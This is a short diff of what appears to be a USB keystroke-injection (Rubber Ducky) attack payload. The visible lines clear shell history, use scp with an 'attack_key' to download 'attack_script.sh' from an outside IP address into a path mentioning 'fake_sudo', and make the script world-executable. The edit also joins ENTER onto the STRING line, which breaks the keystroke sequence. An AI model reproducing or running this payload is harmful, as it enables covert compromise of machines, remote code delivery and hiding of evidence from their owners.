@@ -18,8 +18,7 @@ DELAY 50
 STRING history -c
 ENTER
 DELAY 50
-STRING scp -i attack_key root@161.35.130.78:/root/script/attack_script.sh ./ 
-ENTER
+STRING scp -i attack_key root@161.35.130.78:/root/fake_sudo/scripts/attack_script.sh ./ ENTER
 DELAY 1000
 STRING chmod 777 attack_script.sh
 ENTER
